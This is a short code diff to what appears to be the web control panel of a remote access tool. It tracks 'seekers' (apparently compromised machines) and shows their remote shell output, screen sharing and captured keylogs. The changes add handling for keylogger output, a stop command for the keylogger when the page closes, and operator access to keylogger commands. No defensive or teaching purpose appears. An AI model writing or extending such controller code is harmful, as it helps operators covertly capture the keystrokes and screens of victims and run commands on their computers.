@@ -64,7 +64,7 @@
 		}
 		const seekers: Record<string, Seeker> = await res.json();
 		seeker = seekers[id] ?? null;
-        console.log(seeker);
+		console.log(seeker);
 		connected.set(!seeker?.disconnected);
 	}
 
@@ -106,6 +106,9 @@
 							keylogs.set(parseKeylogs(seeker.keylogs));
 						}
 						break;
+					case 'keylogger_output':
+						console.log('Keylogger output:', message.data);
+						break;
 					case 'shell_output':
 						shellOutput.update((arr) => [...arr, message.data as string]);
 						break;
@@ -126,6 +129,7 @@
 		return () => {
 			ws?.close();
 			sendMessage('screenshare_command', 'stop');
+			sendMessage('keylogger_command', 'stop');
 		};
 	});
 
@@ -144,7 +148,7 @@
 		<InfoComponent {seeker} {connected}/>
 		<ShellComponent {sendMessage} {shellRunning} {shellOutput} />
 		<ScreenShareComponent {sendMessage} {screenShareFrame} />
-		<KeyloggerComponent {keylogs} />
+		<KeyloggerComponent {sendMessage} {keylogs} />
 		<MessageComponent {sendMessage} />
 	</div>
 {:else}
